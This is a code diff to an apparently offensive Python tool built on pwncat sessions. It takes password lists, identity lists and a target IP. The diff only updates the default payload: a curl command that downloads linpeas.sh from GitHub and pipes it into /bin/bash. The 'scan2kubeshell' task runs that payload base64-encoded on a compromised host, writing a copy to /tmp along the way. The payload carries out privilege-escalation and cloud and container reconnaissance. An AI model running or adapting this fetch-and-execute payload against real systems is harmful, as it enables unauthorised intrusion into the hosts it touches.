@@ -26,7 +26,7 @@ parser.add_argument('--password-list', dest='password_list', type=str,
 parser.add_argument('--identity-list', dest='identity_list', type=str,
                     default=None, help='target identities file path (format: base64 encoded single line per identity)')
 parser.add_argument('--payload', dest='payload', type=str,
-                    default=base64.b64encode(b'curl -L https://github.com/carlospolop/PEASS-ng/releases/download/20240218-68f9adb3/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex'), help='target base64 payload to deliver')
+                    default=base64.b64encode(b'curl -L https://github.com/peass-ng/PEASS-ng/releases/download/20240414-ed0a5fac/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files'), help='target base64 payload to deliver')
 parser.add_argument('--task', dest='task', type=str,
                     default="custom", help='target task name - use custom to execute payload')
 parser.add_argument('--target-ip', dest='target_ip', type=str,
@@ -68,7 +68,7 @@ def execute(session: pwncat.manager.Session, task):
             session.log(result)
         elif task == "scan2kubeshell":
             payload = base64.b64encode(
-                b'curl -L https://github.com/carlospolop/PEASS-ng/releases/download/20240218-68f9adb3/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex')
+                b'curl -L https://github.com/peass-ng/PEASS-ng/releases/download/20240414-ed0a5fac/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files')
             result = session.platform.run(
                 f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_connector_linpeas | base64 -d | /bin/bash'",
                 cwd="/tmp", timeout=7200)
